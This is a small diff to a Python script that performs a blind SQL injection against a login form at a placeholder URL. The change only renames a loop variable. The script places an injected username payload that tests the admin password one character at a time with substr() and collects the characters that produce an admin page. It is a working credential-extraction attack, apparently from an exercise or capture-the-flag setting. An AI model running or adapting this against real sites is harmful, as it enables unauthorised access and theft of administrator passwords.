@@ -3,12 +3,12 @@ from bs4 import BeautifulSoup
 
 url = 'http://xxxx.xxx'
 chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_=+[{]}|;:,<.>/?'
-N = 1
+n = 1
 password = []
 
 for char in (chars):
     login_data = {
-        'username': f"admin' and substr(password,{N},1)='{char}'--",
+        'username': f"admin' and substr(password,{n},1)='{char}'--",
         'password': "test"
     }
     response = requests.post(url, data=login_data)
@@ -19,7 +19,7 @@ for char in (chars):
         if h2_title and 'admin' in h2_title.text.lower():
             print(f":{char}")
             password.append(char)
-            N += 1
+            n += 1
         else:
             continue
     else:
